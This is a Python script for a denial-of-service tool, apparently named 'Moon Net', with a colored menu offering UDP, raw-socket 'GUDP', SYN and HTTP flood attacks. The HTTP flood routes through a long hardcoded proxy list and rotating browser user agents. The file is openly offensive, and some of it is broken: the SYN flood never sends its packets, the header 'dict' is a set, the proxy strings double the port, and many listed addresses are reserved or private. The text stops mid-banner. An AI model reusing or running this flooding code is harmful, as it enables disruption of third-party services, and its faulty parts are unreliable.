import colorama
import socket
import struct
import requests
import os
import time
import subprocess
import concurrent.futures
import random
from datetime import datetime

colorama.init()

def fire(text):
    faded = ""
    green = 250
    for line in text.splitlines():
        faded += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
        if not green == 0:
            green -= 25
            if green < 0:
                green = 0
    return faded

def purplepink(text):
    faded = ""
    red = 40
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    return faded



PROXY_LIST = [
    "129.123.123.123:8080",
    "129.123.123.124:8080",
    "129.123.123.125:8080",
    "208.121.122.247:8080",
    "169.143.172.34:8080",
    "88.48.14.43:8080",
    "11.31.81.184:8080",
    "98.122.83.104:8080",
    "224.191.3.245:8080",
    "232.243.68.127:8080",
    "10.26.116.164:8080",
    "193.10.173.150:8080",
    "90.156.150.40:8080",
    "9.203.171.15:8080",
    "178.93.44.76:8080",
    "241.30.128.232:8080",
    "251.75.178.254:8080",
    "23.85.26.224:8080",
    "194.178.133.184:8080",
    "193.7.56.38:8080",
    "144.165.91.121:8080",
    "79.250.236.3:8080",
    "119.243.84.52:8080",
    "38.151.130.214:8080",
    "93.186.23.88:8080",
    "131.46.147.6:8080",
    "18.52.214.187:8080",
    "180.249.190.1:8080",
    "182.187.187.33:8080",
    "141.221.88.5:8080",
    "29.44.121.244:8080",
    "59.255.13.176:8080",
    "233.88.116.98:8080",
    "21.129.237.145:8080",
    "115.13.161.50:8080",
    "77.117.87.240:8080",
    "11.166.86.116:8080",
    "203.210.149.124:8080",
    "132.154.30.139:8080",
    "129.158.99.76:8080",
    "86.165.221.247:8080",
    "207.86.245.25:8080",
    "186.168.228.235:8080",
    "60.253.244.106:8080",
    "20.44.241.10:8080",
    "195.174.183.88:8080",
    "101.207.182.51:8080",
    "25.63.251.37:8080",
    "29.76.174.217:8080",
    "188.14.28.54:8080",
    "98.78.24.42:8080",
    "239.13.54.26:8080",
    "74.127.129.99:8080",
    "14.195.189.49:8080",
    "230.161.228.196:8080",
    "136.35.221.55:8080",
    "148.159.23.157:8080",
    "116.36.48.183:8080",
    "91.232.170.245:8080",
    "224.158.184.214:8080",
    "230.53.246.132:8080",
    "233.35.31.173:8080",
    "230.173.8.219:8080",
    "51.192.117.193:8080",
    "35.85.181.55:8080",
    "178.102.33.176:8080",
    "114.30.195.63:8080",
    "45.123.78.248:8080",
    "215.73.168.210:8080",
    "234.11.33.5:8080",
    "47.108.197.251:8080",
    "8.131.196.21:8080",
    "229.41.230.39:8080",
    "154.243.173.187:8080",
    "35.216.243.109:8080",
    "45.36.45.51:8080",
    "70.68.133.179:8080",
    "204.110.184.77:8080",
    "187.0.174.250:8080",
    "207.53.207.10:8080",
    "189.230.163.60:8080",
    "41.157.27.247:8080",
    "28.43.177.131:8080",
    "75.173.55.78:8080",
    "43.177.13.130:8080",
    "207.67.149.59:8080",
    "29.40.22.58:8080",
    "197.66.119.157:8080",
    "42.97.201.128:8080",
    "16.28.156.56:8080",
    "26.17.217.148:8080",
    "52.226.208.235:8080",
    "156.143.151.27:8080",
    "41.91.230.65:8080",
    "97.26.117.40:8080",
    "21.205.13.183:8080",
    "151.31.42.27:8080",
    "33.80.30.161:8080",
    "137.27.205.205:8080",
    "55.92.97.81:8080",
    "179.128.183.102:8080",
    "80.179.180.58:8080",
    "8.247.97.168:8080",
]

def clear_screen():
    if os.name == "nt":  # Windows
        _ = os.system("cls")
    else:  # Unix-based systems (e.g., Linux and macOS)
        _ = os.system("clear")

def send_request(target_url):
    headers = {
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    }

    proxy = random.choice(PROXY_LIST)
    proxies = {
        "http": f"http://{proxy}:8080",
        "https": f"http://{proxy}:8080",
    }

    try:
        response = requests.get(target_url, headers=headers, proxies=proxies, timeout=5)
        print(f"Sent request to {target_url} via {proxy}")
    except Exception as e:
        print(f"Failed to send request to {target_url} via {proxy}: {e}")

def purplepink(text):
    faded = ""
    red = 40
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    return faded

def fire(text):
    faded = ""
    green = 250
    for line in text.splitlines():
        faded += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
        if not green == 0:
            green -= 25
            if green < 0:
                green = 0
    return faded

def purpleblue(text):
    faded = ""
    red = 110
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;255m{line}\033[0m\n")
        if not red == 0:
            red -= 15
            if red < 0:
                red = 0
    return faded

def gudp_flood(target_ip, target_port, packet_count):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    start_time = time.time()
    packet = struct.pack("!I", int(start_time))
    packet += b"\x00" * 16
    packet += struct.pack("!H", target_port)
    packet += b"\x00" * 8
    packet += b"\x50"

    for _ in range(packet_count):
        s.sendto(packet, (target_ip, target_port))

    end_time = time.time()
    elapsed_time = end_time - start_time

    end_time = time.time()
    elapsed_time = end_time - start_time
    print(fire("✔GUDP Flood Attack Sent Succesfully✔\n"))
    print(f"•Time sent : {time.strftime('%I:%M %p', time.localtime())}\n")
    print(f"•Target IP : {target_ip}•\n")
    print(f"•Target port : {target_port}•\n")
    print(f"•Packets sent : {packet_count}•\n")
    input("Press enter to go back...")
    main()

def send_gudp_packet(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    packet = struct.pack("!I", int(time.time())) + "\x00" * 16 + struct.pack("!H", target_port) + "\x00" * 8 + b"\x50"
    s.sendto(packet, (target_ip, target_port))

def udp_flood(target_ip, target_port, packet_count):
    start_time = time.time()
    for _ in range(packet_count):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b"", (target_ip, target_port))
    end_time = time.time()
    elapsed_time = end_time - start_time
    print(" ")
    print(fire("✔UDP Flood Attack Sent Succesfully✔\n"))
    print(purpleblue(f"•Time sent : {time.strftime('%I:%M %p', time.localtime())}\n"))
    print(" ")
    print(purpleblue(f"•Target IP : {target_ip}•\n"))
    print(purpleblue(f"•Target port : {target_port}•\n"))
    print(purpleblue(f"•Packets sent : {packet_count}•\n"))
    input(purpleblue("Press enter to go back..."))
    main()

def send_udp_packet(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b"", (target_ip, target_port))

def http_flood(target_urls, request_count):
    for url in target_urls:
        for i in range(request_count):
            try:
                proxy = random.choice(PROXY_LIST)
                proxies = {"http": proxy, "https": proxy}
                requests.get(url, proxies=proxies, timeout=5)
                print(f"Sent request {i+1} to {url} through {proxy}")
            except Exception as e:
                print(f"Error sending request {i+1} to {url} through {proxy}: {e}")

def syn_flood(target_ip, target_port, packet_count):
    for _ in range(packet_count):
        create_syn_packet(target_ip, target_port)

def create_syn_packet(target_ip, target_port):
    seq_num = random.randint(1,10000)
    ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 0x003C, 0, 0, 0xFF, 0x11, 0x22, socket.inet_aton(target_ip), socket.inet_aton('192.168.0.1'))
    tcp_header = struct.pack('!HHLLBBHHH', 0x0002, 0x1234, 0x0000, target_port, 0x0050, 0x0000, 0x0002, 0x0000, seq_num)
    p = ip_header + tcp_header
    return p, seq_num

def help_command():
    from colorama import Fore
    clear_screen()
    print(fire("""
                    ╔═════════════╗
                      ╦ ╦╔═╗╦  ╔═╗
                      ╠═╣║╣ ║  ╠═╝
                      ╩ ╩╚═╝╩═╝╩  
                    ╚═════════════╝
                 ╔═══════════════════╗
                 ║    •help          ║
                 ║    •udp-flood     ║
                 ║    •gudp-flood    ║
                 ║    •syn-flood     ║
                 ║    •http-flood    ║
                 ╚═══════════════════╝

            """))

def attack_command(method):
    if method == "udp-flood":
        clear_screen()
        print(purplepink("""
    |Moon Net - Created by Kserksis | Status - Online |
 
 
                ╔════════════════════════╗
                ║╔╦╗╔═╗╔═╗╔╗╔   ╔╗╔╔═╗╔╦╗║
